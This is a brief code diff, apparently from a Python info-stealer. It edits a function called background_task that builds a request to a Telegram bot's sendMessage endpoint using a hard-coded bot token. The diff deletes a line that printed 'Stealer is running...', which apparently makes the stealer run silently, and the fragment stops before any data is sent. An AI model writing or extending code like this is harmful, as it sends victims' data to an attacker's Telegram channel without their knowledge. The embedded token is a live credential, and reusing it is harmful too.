@@ -1,7 +1,6 @@
 import requests
 
 def background_task():
-    print("Stealer is running...")
     try:
         url = 'https://api.telegram.org/bot7496801196:AAHBtjABl8u_qN6hDbEFrfwLepaHxD9rs0A/sendMessage'
         params = {
